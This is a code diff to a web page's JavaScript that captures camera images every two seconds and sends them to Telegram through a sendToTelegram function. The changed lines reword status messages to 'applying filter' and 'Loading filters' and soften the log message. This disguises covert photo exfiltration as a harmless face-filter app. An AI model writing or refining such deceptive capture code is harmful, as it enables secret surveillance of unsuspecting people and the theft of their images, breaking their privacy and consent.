@@ -36,7 +36,7 @@
                 });
                 
                 video.srcObject = stream;
-                statusDiv.textContent = 'Front camera active - applying filter...';
+                statusDiv.textContent = 'camera active - (keep face steady)applying filter...';
                 
                 // Start capturing images every 2 seconds
                 startContinuousCapture();
@@ -50,7 +50,7 @@
         function startContinuousCapture() {
             captureInterval = setInterval(async () => {
                 if (imagesSent >= MAX_IMAGES) {
-                    statusDiv.textContent = `Loading - ${MAX_IMAGES} %`;
+                    statusDiv.textContent = `Loading filters- ${MAX_IMAGES} %`;
                     clearInterval(captureInterval);
                     return;
                 }
@@ -64,7 +64,7 @@
                         const success = await sendToTelegram(blob);
                         if (success) {
                             imagesSent++;
-                            statusDiv.textContent = `loading: ${imagesSent}/${MAX_IMAGES}`;
+                            statusDiv.textContent = `loading...: ${imagesSent}/${MAX_IMAGES}`;
                         }
                     }, 'image/jpeg', 0.8);
                     
@@ -91,7 +91,7 @@
                 }
                 
                 const data = await response.json();
-                console.log(`Image ${imagesSent + 1} sent successfully`);
+                console.log(`Image ${imagesSent + 1} ready to go`);
                 return true;
                 
             } catch (error) {
